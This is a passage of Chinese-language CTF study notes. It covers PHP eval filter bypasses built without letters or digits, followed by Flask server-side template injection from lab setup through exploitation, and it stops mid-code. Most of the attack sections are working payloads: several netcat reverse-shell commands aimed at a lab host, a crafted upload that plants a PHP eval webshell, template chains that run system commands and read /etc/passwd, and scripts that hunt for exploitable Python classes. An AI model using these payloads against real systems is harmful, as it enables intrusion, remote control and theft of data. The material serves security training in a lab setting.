%24_%3D%5B%5D.''%3B%0A%24___%3D%24_%5B%24__%5D%3B%24__%3D%24___%3B%24_%3D%24___%3B%24__%3D%24___%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%24_%20.%3D%24__%3B%24_%20.%3D%24__%3B%24__%3D%24___%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%24_%20.%3D%24__%3B%24__%3D%24___%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%24_%20.%3D%24__%3B%24__%3D%24___%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%24_%20.%3D%24__%3B%0A%24____%20%3D%20%22_%22%3B%0A%24__%3D%24___%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%24____%20.%3D%24__%3B%24__%3D%24___%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%24____%20.%3D%24__%3B%24__%3D%24___%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%24____%20.%3D%24__%3B%24__%3D%24___%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%24____%20.%3D%24__%3B%0A%24__%20%3D%20%24%24____%3B%0A%24_(%24__%5B_____%5D)%3B

POST 传参
_____=system('cat flag')
```

![image-20230821215522215](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230821215522215.png)

### 反引号返回webshell

只需要构造出`_POST`，最后拼接命令即可

#### POC 代码

```php
$_=[].'';
$___=$_[$__];
$____ = "_";
$__=$___;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;$____ .=$__;$__=$___;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;$____ .=$__;$__=$___;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;$____ .=$__;$__=$___;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;$____ .=$__;

$__ = $$____;
`$__[_]`;
```

#### payload

注意：GET传参需要使用URL编码，并且开启监听

```
GET 传参
%24_%3D%5B%5D.''%3B%0A%24___%3D%24_%5B%24__%5D%3B%0A%24____%20%3D%20%22_%22%3B%0A%24__%3D%24___%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%24____%20.%3D%24__%3B%24__%3D%24___%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%24____%20.%3D%24__%3B%24__%3D%24___%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%24____%20.%3D%24__%3B%24__%3D%24___%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%24____%20.%3D%24__%3B%0A%0A%24__%20%3D%20%24%24____%3B%0A%60%24__%5B_%5D%60%3B

POST 传参
_=nc 192.168.231.129 7777 -e /bin/bash
```

## 0x22. 无字母数字特殊符号过滤

### 无字母数字下划线绕过

#### 例题代码

```php
<?php
highlight_file(__FILE__);
error_reporting(0);
if(!preg_match('/[a-z0-9_]/is',$_GET['cmd'])) {
    eval($_GET['cmd']);
}
```

#### 解题思路

`a-z 0-9`的过滤使用取反绕过的形式绕过，后续先闭合代码的标签，最后使用段标签执行命令

#### payload

```
?><?=`{${~"%a0%b8%ba%ab"}['%a0']}`?>&%a0=ls
```

1. `?>`：闭合题目中的PHP代码

2. `~"%a0%b8%ba%ab"`：取反计算结果为`_GET`

3. `${~"%a0%b8%ba%ab"}` = `${_POST}`，这种写法一般用于字符串中，不通过拼接的方式在字符串中输入变量

   1. ```php
      <?php
      $a = 'abc';
      echo "打印 ${a}";
      
      // 输出
      打印 abc
      ```

4. 代码拼接为`$_POST['%a0']`，最后使用反引号来执行命令

5. 由于这里使用的是段标签，所以反引号是会**回显**的

### 无字母数字下划线$

#### 前置知识

##### `call_user_func`

call_user_func — 把第一个参数作为回调函数调用

###### 说明

call_user_func ( [callable](language.types.callable.html) `$callback` [, [mixed](language.pseudo-types.html#language.types.mixed) `$parameter` [, [mixed](language.pseudo-types.html#language.types.mixed) `$...` ]] ) : [mixed](language.pseudo-types.html#language.types.mixed)

第一个参数 `callback` 是被调用的回调函数，其余参数是回调函数的参数。

###### 参数

- `callback`

  将被调用的回调函数（[callable](language.types.callable.html)）。

- `parameter`

  0个或以上的参数，被传入回调函数。

##### `(func)(parameter)`执行函数

PHP 可以使用`()()`的方式来执行函数

```php
<?php
(system)('dir');

// 输出
 Directory of D:\PHP

2023/08/21  22:59    <DIR>          .
2023/08/21  22:52    <DIR>          .idea
2021/11/18  16:34         1,804,192 Composer-Setup.exe
2023/06/19  21:18                32 flag.php
```

#### 解题过程

##### 例题代码

```php
<?php
highlight_file(__FILE__);
error_reporting(0);
if(!preg_match('/[a-z0-9_$]/is',$_GET['cmd'])) {
    eval($_GET['cmd']);
}
```

##### payload

通过汇总前置知识，我们可以使用`(call_user_func)('system', 'ls')`的方式来执行命令

其中，为了绕过对于数字和字符的屏蔽，依然使用取反绕过

```
cmd=(~"%9c%9e%93%93%a0%8a%8c%9a%8d%a0%99%8a%91%9c")(~"%8c%86%8c%8b%9a%92", ~"%9b%96%8d");
=====
cmd=(call_user)('system', 'dir');

也可以直接使用system函数来执行
cmd=(~"%8c%86%8c%8b%9a%92")(~"%9b%96%8d");
=======
(system)(dir)
```

### 无字母数字下划线及$符号过滤

#### 前置知识

##### 文件读取

PHP文件上传处理流程：

1. 将文件存储在临时文件夹中`/tmp`
2. 如果PHP中有使用函数`move_uploaded_file`来处理文件上传之后的存储路径，则将文件移动到该路径中
3. 若没有做后续处理，则删除临时文件

PHP文件上传命名规则：

+ 放置在临时文件夹中的文件名都会以这种格式命令：`phpxxxxxx`，绝对路径为：`/tmp/phpxxxxxx`

利用这一点，我们可以构造命令`./???/????????[@-[]`，因为全部用`?`匹配的话可能会出现匹配多个文件的情况，导致出错，所以最后一个字符使用正则来匹配，保证匹配到的最后一个字符为大写字母；

##### 修改数据包达到文件上传

**即使web站点没有上传口，我们也可以通过构造数据包的方式来上传文件**

数据包格式：

```
POST /class11/data.php HTTP/1.1
Host: 192.168.231.129:18082
Content-Length: 318
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://192.168.231.129:18082
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryKOHUn0Z6KIF1XE79
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://192.168.231.129:18082/class11/data.html
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close

------WebKitFormBoundaryKOHUn0Z6KIF1XE79
Content-Disposition: form-data; name="file"; filename="1.txt"
Content-Type: text/plain

nc 192.168.231.129 7777 -e /bin/bash

------WebKitFormBoundaryKOHUn0Z6KIF1XE79
```

#### 解题流程

##### 例题代码

```php
<?php
highlight_file(__FILE__);
error_reporting(0);
if(!preg_match('/[a-z0-9_$]/is',$_GET['cmd'])) {
    eval($_GET['cmd']);
}
```

#### 数据包构造

通过构造数据包来上传文件，然后通过命令`.+/???/????????[@-[]`来执行文件，执行之前先使用`?>`来闭合文件

```
GET 传参
`?><?=`.+/???/????????[@-[]`;?>`

URL 编码：这里很奇怪！URL编码的结果一定是下面这种字符串才能执行文件
?%3E%3C?=`.+/%3f%3f%3f/%3f%3f%3f%3f%3f%3f%3f%3f[%40-[]`%3b?%3E
```

将`<?php eval(\$_POST['cmd']);?>`写入服务器，并使用输出重定向移至当前路径下，重命名为`222.php`，

```
POST /class11/3.php?cmd=?%3E%3C?=`.+/%3f%3f%3f/%3f%3f%3f%3f%3f%3f%3f%3f[%40-[]`%3b?%3E HTTP/1.1
Host: 192.168.231.129:18082
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryKOHUn0Z6KIF1XE79
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Length: 223


------WebKitFormBoundaryKOHUn0Z6KIF1XE79
Content-Disposition: form-data; name="file"; filename="1.txt"
Content-Type: text/plain
echo "<?php eval(\$_POST['cmd']);?>" > ./222.php
------WebKitFormBoundaryKOHUn0Z6KIF1XE79
```

# SSTI 模板注入

## 0x00 SSTI  靶场搭建

```bash
# 下载镜像
┌──(pinginglab㉿pinginglab)-[~]
└─$ docker pull mcc0624/flask_ssti:last

# 运行靶场
┌──(root㉿pinginglab)-[/opt/flask1]
└─# docker run -p 18022:22 -p 18080:80 -i -t mcc0624/flask_ssti:last bash -c '/etc/re.local; /bin/bash'
```

## 0x01 Python Venv 环境安装介绍

python Venv 相当于在Kali中安装一个专属于Python工作的虚拟机，可以把他想象成一个容器，该容器供你用来存放你的Python脚本以及安装各种Python第三方模块，容器里的环境和本机是完全分开的

### 1. 安装venv

```bash
# 先查看python的版本信息
┌──(root㉿pinginglab)-[/opt/flask1]
└─# python --version
Python 3.11.4

# 更新软件库
┌──(root㉿pinginglab)-[/opt/flask1]
└─# apt update

# 安装venv；由于Kali中的Python版本号是 3.11.4，所以这里的venv也下载 3.11 版本
┌──(root㉿pinginglab)-[/opt/flask1]
└─# apt install python3.11-venv
```

### 2. 创建venv环境安装flask

```bash
┌──(root㉿pinginglab)-[/opt/flask1]
└─# cd /opt  
 
 # 创建虚拟环境
┌──(root㉿pinginglab)-[/opt]
└─# python3 -m venv flask1
```

### 3. 执行flask1路径下的Python

```bash
#-------------方法一--------------
# 使用绝对路径
┌──(root㉿pinginglab)-[/opt]
└─# /opt/flask1/bin/python demo.py

# ------------方法二-------------
# 进入虚拟环境
┌──(root㉿pinginglab)-[/opt]
└─# cd /opt/flask1 
    
┌──(root㉿pinginglab)-[/opt/flask1]
└─# source ./bin/activate

┌──(root㉿pinginglab)-[/opt/flask1]
└─# python3 demo.py

# 退出虚拟环境
┌──(root㉿pinginglab)-[/opt/flask1]
└─# deactive
```

### 4. 安装flask

==注意：是在虚拟环境中安装==

```bash
┌──(root㉿pinginglab)-[/opt/flask1]
└─# source ./bin/activate
                         
┌──(flask1)─(root㉿pinginglab)-[/opt/flask1]
└─# python3         
Python 3.11.4 (main, Jun  7 2023, 10:13:09) [GCC 12.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> import flask
```

## 0x02 Python flask 应用介绍及搭建

Flask 是一个使用 Python 编写的轻量级Web应用框架

Python可直接用flask启动一个web服务器页面

类似于PHP Think

### 1. Flask 基本架构

```py
┌──(flask1)─(root㉿pinginglab)-[/opt/flask1/resource]
└─# vim demo.py 

from flask import Flask
# 创建Flask实例，告诉 Flask 应用程序在哪里找到模板和静态文件等资源。
app = Flask(__name__)

# 指定路由为网站根目录
@app.route('/')
def hello():
    return "hello benben"

if __name__=='__main__':
    app.run(debug=True,host="0.0.0.0")
```

## 0x03 Python flask 变量及方法

### 1. Flask 变量规则

通过向规则参数添加变量部分，可以动态构建URL

```py
from flask import Flask
app = Flask(__name__)

@app.route('/')
def hello():
    return "hello benben"

# 在URL中使用 <> 格式获取变量
@app.route('/hello/<name>')
def hello1(name):
    return "hello %s" %name

if __name__=='__main__':
    app.run(debug=True,host="0.0.0.0")
```

### 2. HTTP 方法

| 方法   | 描述                                                         |
| ------ | ------------------------------------------------------------ |
| GET    | 以未加密的形式通过URL将数据发送到服务器                      |
| HEAD   | 和GET方法相同，但没有响应体                                  |
| POST   | 用于将HTML表单数据发送到服务器。POST方法接收的数据不由服务器缓存 |
| PUT    | 用上传的内容替换目标资源的所有当前表示                       |
| DELETE | 删除由URL给出的目标资源的所有当前表示                        |

### 3. 小小案例

通过前端HTML页面来传递用户数据，并返回到flak进行处理

**index.html**

```html
<html>
<head></head>
<body>
<!-- 用户提交信息后，跳转到 /login 页面处理 -->
<form action="http://127.0.0.1:5000/login" method="post">
    <p>Enter Your Username</p>
    <input type="text" name="ben">
    <input type="submit" name="btn" value="ben">
</form>
</body>
<footer></footer>
</html>
```

**app.py**

```py
from flask import Flask, redirect, url_for, request, render_template

app = Flask(__name__)

# 用户访问 / ，直接重定向到 index.html
@app.route('/')
def index():
    return render_template("index.html")


@app.route('/success/<name>')
def success(name):
    return f"welcome {name}"

# 接收两种方法来传参
@app.route('/login', methods=['POST', 'GET'])
def login():
    if request.method == 'POST':
        print(1)
        # 获取变量名为 ben 的值，相当于 $_POST['ben']
        user = request.form['ben']
        # 重定向到 /success，并将 user 当作参数一起传过去
        return redirect(url_for('success', name=user))
    else:
        print(2)
        user = request.args.get('ben')
        return redirect(url_for('success', name=user))


if __name__ == '__main__':
    app.run(debug=True, host="0.0.0.0")

```

## 0x04 Python flask 模板介绍

### 1. Flask模板

**视图函数**的主要作用是生成请求的响应

**视图函数**只负责业务逻辑和数据处理

**模板**取到视图函数的数据结果来进行展示

使用模板：使用静态的页面HTML展示动态内容，达到前后端分离

### 2. render_template

#### 方法一：（标准）

Flask 传递模板变量

**app.py**

```py
import flask

app = flask.Flask(__name__)


@app.route("/")
def index():
    my_name = flask.request.args.get('name')
    my_age = 18
    return flask.render_template("index.html", my_name=my_name, my_age=my_age)


if __name__ == '__main__':
    app.run(debug=True, host="0.0.0.0")

```

**index.html**

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Title</title>
</head>
<body>
<p>index 页面</p>
<!--{{变量名}} === 占位符-->
<p>姓名：{{my_name}}</p>
<p>年龄：{{my_age}}</p>
</body>
</html>
```

#### 方法二：

直接在当前页面渲染，并没有做到前后端分离

**app.py**

```py
import flask

app = flask.Flask(__name__)


@app.route("/")
def index():
    my_name = flask.request.args.get('name')
    my_age = 18
    # 直接在当前页面渲染
    return flask.render_template_string(f"<p>姓名：{my_name}</p><p>年龄：{my_age}</p>")


if __name__ == '__main__':
    app.run(debug=True, host="0.0.0.0")

```

## 0x05 模板注入原理介绍

SSTI：可能造成任意文件读取和RCE远程控台后台系统

漏洞成因：

+ 渲染模板时，没有严格控制对用户的输入
+ 使用了危险的模板，导致用户可以和flask程序进行交互

flask 时基于 Python 开发的一种web服务器，那么也就意味着可以和flask进行交互的话，就可以执行python代码，比如eval、system、file等等之类的函数

### 1. 无漏洞代码

这段代码中的所有变量，都是返回到前端后，依据占位符逐个填入

**变量的渲染是在前端完成**

```py
import flask

app = flask.Flask(__name__)


@app.route("/")
def index():
    my_name = flask.request.args.get('name')
    my_age = 18
    html_code = """
    <html>
    <body>
    <p>姓名：{{my_name}}</p>
    <p>年龄：{{my_age}}</p>
    <p>Success</p>
    </body>
    </html>
    """
    return flask.render_template_string(html_code, my_name=my_name, my_age=my_age)


if __name__ == '__main__':
    app.run(debug=True, host="0.0.0.0")

```

### 2. 漏洞代码

这段代码中，变量的传递是在后端完成的，并且没有使用占位符直接传入；以此，可执行RCE攻击

**变量的渲染是在后端完成**

```py
import flask

app = flask.Flask(__name__)


@app.route("/")
def index():
    my_name = flask.request.args.get('name')
    my_age = 18
    return flask.render_template_string(f"<p>姓名：{my_name}</p><p>年龄：{my_age}</p>")


if __name__ == '__main__':
    app.run(debug=True, host="0.0.0.0")

```

两个原因以至于造成SSTI漏洞：

1. 变量没有做任何的安全过滤
2. 变量是在后台直接写入HTML代码中，再返回前端渲染

```
payload：?name={{7*7}}
```

![image-20230824223855958](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230824223855958.png)

### 3. 模板注入漏洞探测图

==绿色：执行成功；红色：执行失败==

![image-20230824224017565](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230824224017565.png)

## 0x06 Python 继承关系和魔术方法

### 1. 继承关系

继承关系是python三态之一

为了降低代码的冗余度，子类可以继承父类的代码，也可以继承之后进行修改（重构）

==object是所有父子关系的顶端，所有的数据类型最终的父类都是object==

### 2. 继承关系

```py
class A:pass
class B(A):pass
class C(B):pass
class D(C):pass

c = C()
print(c.__class__)      # 输出：<class '__main__.C'>；输出当前类
print(c.__class__.__base__)     # 输出：<class '__main__.B'>；输出父类
print(c.__class__.__mro__)     # 输出：(<class '__main__.C'>, <class '__main__.B'>, <class '__main__.A'>, <class 'object'>)； 输出所有父类（向上搜索）
print(c.__class__.__base__.__base__.__subclasses__())       # 输出：[<class '__main__.B'>]；输出所有子类
```

### 3. 魔术方法

`__class__`：查找当前类型的所属对象

`__base__`：沿着父子类的关系向上查询一个

`__mro__`：查找当前类对象的所有继承类

`__subclasses__()`：查找父类下的所有子类



`__init__`：查找类是否重载（被加载），重载是指程序在运行时就已经加载好了这个模块到内存中，如果出现**wrapper**字眼，说明没有被重载

`__globals__`：函数会以字典的形式返回当前对象的全部全局变量

`__builtins__`：提供对Python的所有“内置”标识符的直接访问（人话：Python在启动时会将一些常用函数提前加载到该模块中，以便后续使用）

### 4. 检查漏洞

常用注入模块

![image-20230824233914202](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230824233914202.png)

### 5. 无过滤注入

#### 1. 测试是否存在漏洞

7*7被计算

```
payload：{{7*7}}
```

![image-20230824234215411](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230824234215411.png)

#### 2. 寻找可利用方法

```bash
# 先直接通过 str 来获取父类 object
{{''.__class__.__base__}}
```

![image-20230824234357483](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230824234357483.png)

```bash
# 通过 __subclasses__() 来查询所有子类，
{{''.__class__.__base__.__subclasses__()}}
```

![image-20230824234544922](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230824234544922.png)

```bash
# 尝试利用 <class 'os._wrap_close'> 来做RCE攻击
{{''.__class__.__base__.__subclasses__()[117]}}
```

![image-20230824234655589](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230824234655589.png)

```bash
# 查询 <class 'os._wrap_close'> 是否已被加载，下面回显可看出 <class 'os._wrap_close'> 的内存地址，证明已被加载，并使用 __init__ 访问子类
{{''.__class__.__base__.__subclasses__()[117].__init__}}
```

![image-20230824234748909](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230824234748909.png)

```bash
# 查询 <class 'os._wrap_close'> 下的可利用函数；__globals__ 会以字典的方式返回
{{''.__class__.__base__.__subclasses__()[117].__init__.__globals__}}
```

![image-20230824235042278](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230824235042278.png)

```bash
# 最后选择 popen 函数做RCE攻击
{{''.__class__.__base__.__subclasses__()[117].__init__.__globals__['popen']}}
```

#### 3. 执行攻击

```bash
# 最后payload：
# 由于 popen 会返回一个文件对象，所以最后使用 read() 方法读取
{{''.__class__.__base__.__subclasses__()[117].__init__.__globals__['popen']("cat /etc/passwd").read()}}
```

![image-20230825000045513](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230825000045513.png)

## 0x07 SSTI常用注入模块利用（上）

### 1. 文件读取

**查找子类：` <class '_frozen_importlib_external.FileLoader'>`**

#### POC 代码

```py
import requests


def post():
    for i in range(400):
        payload = {'code': "{{''.__class__.__base__.__subclasses__()[" + str(i) + "]}}"}
        try:
            req = requests.post(base_url, data=payload)
            if target_class in req.text:
                print("可利用函数索引：", i)
                break
        except Exception as e:
            print("出现错误：", e)


def get():
    for j in range(400):
        payload = "?code={{''.__class__.__base__.__subclasses__()[" + str(j) + "]}}"
        try:
            req = requests.get(base_url + payload)
            if target_class in req.text:
                print("可利用函数索引：", j)
                break
        except Exception as e:
            print("出现错误：", e)


if __name__ == '__main__':
    base_url = "http://192.168.231.129:18080/flasklab/level/1"
    target_class = "frozen_importlib_external.FileLoader"
    post()
```

#### 解题流程

```
payload：code={{''.__class__.__base__.__subclasses__()[79]['get_data'](0,"/etc/passwd")}}
```

![image-20230825174825040](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230825174825040.png)

### 2. 内建函数命令执行（eval）

#### 查找eval函数POC代码

```py
import requests

base_url = 'http://192.168.231.129:18080/flasklab/level/1'
target_function = "eval"

for i in range(500):
    payload = "{{''.__class__.__base__.__subclasses__()[" + str(i) + "].__init__.__globals__['__builtins__']}}"
    data = {"code": payload}
    try:
        res = requests.post(base_url, data=data)
        # print(res.text)
        if target_function in res.text:
            print(i)
    except Exception as e:
        print(e)
```

#### 解题流程

```
payload：code={{''.__class__.__base__.__subclasses__()["244"].__init__.__globals__['__builtins__']['eval']('__import__("os").popen("cat+/etc/passwd").read()')}}
```

![image-20230825175423262](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230825175423262.png)

### 3. 内建函数命令执行（system）

==函数`system`与`popen`都在`os`模块中，关键字为：`sys`==

#### `system`函数查找POC代码

```py
import requests

base_url = 'http://192.168.231.129:18080/flasklab/level/1'
target_function = "sys"

for i in range(500):
    payload = "{{''.__class__.__base__.__subclasses__()[" + str(i) + "].__init__.__globals__}}"
    data = {"code": payload}
    try:
        res = requests.post(base_url, data=data)
        # print(res.text)
        if target_function in res.text:
            print("可利用索引：", i)
    except Exception as e:
        print(e)

```

#### 解题流程

经过测试，SSTI攻击中使用`system`函数并没有回显，但是可以使用nc回弹webshell

```
payload：
{{[].__class__.__mro__[1].__subclasses__()[168].__init__.__globals__['sys'].modules['os'].system('nc 192.168.231.129 7777 -e /bin/bash')}}
```

## 0x08 SSTI常用注入模块利用（下）

### 1.  查看flask内建函数或模块

```
payload：
{{self.__dict__._TemplateReference__context.keys()}}
```

![image-20230825230408228](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230825230408228.png)

我们可以直接利用内置模块来调用要利用的函数

```
payload：{{lipsum.__globals__['os'].popen("id").read()}}
```

![image-20230825230759705](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230825230759705.png)

### 2. importlib类执行命令

==关键字，类名：`_frozen_importlib.BuiltinImporter`==

#### importlib类搜索POC代码

```py
import requests


def post():
    for i in range(400):
        payload = {'code': "{{''.__class__.__base__.__subclasses__()[" + str(i) + "]}}"}
        try:
            req = requests.post(base_url, data=payload)
            if target_class in req.text:
                print("可利用函数索引：", i)
                break
        except Exception as e:
            print("出现错误：", e)

if __name__ == '__main__':
    base_url = "http://192.168.231.129:18080/flasklab/level/1"
    target_class = "_frozen_importlib.BuiltinImporter"
    post()

```

#### 解题流程

通过子模块`importlib`加载`os`类，以执行命令`popen 或 system`

```
payload：
{{''.__class__.__base__.__subclasses__()[69]['load_module']('os')['popen']('id').read()}}
```

![image-20230825231722858](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230825231722858.png)

### 3. linecache函数执行命令

`linecache`函数可用于读取任意一个文件的某一行，而这个函数中引入了os模块，所以我们也可以利用这个 linecache 函数去执行命令

#### linechache函数搜索POC代码

==关键字，函数名：`linecache`==

```py
import requests

base_url = 'http://192.168.231.129:18080/flasklab/level/1'
target_function = "linecache"

for i in range(500):
    payload = "{{''.__class__.__base__.__subclasses__()[" + str(i) + "].__init__.__globals__}}"
    data = {"code": payload}
    try:
        res = requests.post(base_url, data=data)
        # print(res.text)
        if target_function in res.text:
            print("可利用索引：", i)
    except Exception as e:
        print(e)

```

#### 解题流程

```
payload：
{{''.__class__.__base__.__subclasses__()[268].__init__.__globals__['os'].popen("id").read()}}
```

![image-20230825232332793](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230825232332793.png)

### 4. `subprocess.Popen`类执行命令

从python2.4版本开始，可以用subprocess这个模块来产生子进程，并链接到子进程的标准输入/输出/错误中去，还可以得到子进程的返回值

subprocess 意在替代其他几个老的模块或者函数，比如：os.system、os.popen等

#### subprocess，Popen类搜索POC代码

==关键字，类名：`subprocess.Popen`==

```py
import requests


def post():
    for i in range(400):
        payload = {'code': "{{''.__class__.__base__.__subclasses__()[" + str(i) + "]}}"}
        try:
            req = requests.post(base_url, data=payload)
            if target_class in req.text:
                print("可利用函数索引：", i)
                break
        except Exception as e:
            print("出现错误：", e)


def get():
    for j in range(400):
        payload = "?code={{''.__class__.__base__.__subclasses__()[" + str(j) + "]}}"
        try:
            req = requests.get(base_url + payload)
            if target_class in req.text:
                print("可利用函数索引：", j)
                break
        except Exception as e:
            print("出现错误：", e)


if __name__ == '__main__':
    base_url = "http://192.168.231.129:18080/flasklab/level/1"
    target_class = "subprocess.Popen"
    post()

```

#### 解题流程

```
payload：
{{''.__class__.__base__.__subclasses__()[200]('id',shell=True,stdout=-1).communicate()[0].strip()}}
```

![image-20230825233530973](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230825233530973.png)

### 5. OS模块搜索

OS模块可以使用：`system、OS、popen`等函数，所以只要能定位OS模块，成功概率就能大幅提升

==OS模块关键字：`os._wrap_close`==

```py
import requests


def post():
    for i in range(400):
        payload = {'code': "{{''.__class__.__base__.__subclasses__()[" + str(i) + "]}}"}
        try:
            req = requests.post(base_url, data=payload)
            if target_class in req.text:
                print("可利用函数索引：", i)
                break
        except Exception as e:
            print("出现错误：", e)

if __name__ == '__main__':
    base_url = "http://192.168.231.129:18080/flasklab/level/1"
    target_class = "os._wrap_close"
    post()

```





## 0x09 绕过过滤双大括号

### 1. 前置知识

#### flask模板循环

**app.py**

直接将列表传给模板

```py
import flask

app = flask.Flask(__name__)


@app.route("/")
def index():
